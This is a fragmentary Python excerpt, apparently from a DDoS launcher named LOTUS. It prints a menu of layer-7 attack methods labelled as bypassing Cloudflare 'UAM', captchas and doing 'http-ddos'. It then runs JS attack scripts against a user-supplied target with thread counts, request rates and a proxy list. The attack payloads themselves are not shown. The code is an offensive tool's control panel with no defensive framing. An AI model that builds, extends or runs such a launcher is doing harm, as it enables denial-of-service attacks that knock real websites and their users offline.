...
def show_menu():
    ...
    print()
    print("\033[34m       WELCOME TO LOTUS\033[38m3 ")
    print("")
    print()
    print("============= Method layer 7 ============")
    print("  ==> VVIP")
    print("  [1] - BLACK-CHIP    [bypass uam/captcha]")
    print("  [2] - HTTP          [http-ddos]")
    print("  [3] - MIX           [cf-bypass]")
...
def handle_menu_selection(selection):
    if selection == '1':
        ...
        run_script('BLACK-CHIP.js', [target, time, thread, proxy_file, requests, mode])
        ...
        proxy_count = count_proxy(proxy_file)
        print(f"  daptar proxy: {proxy_count}")
        run_script('MIX.js', [target, time, requests, thread, proxy_file])
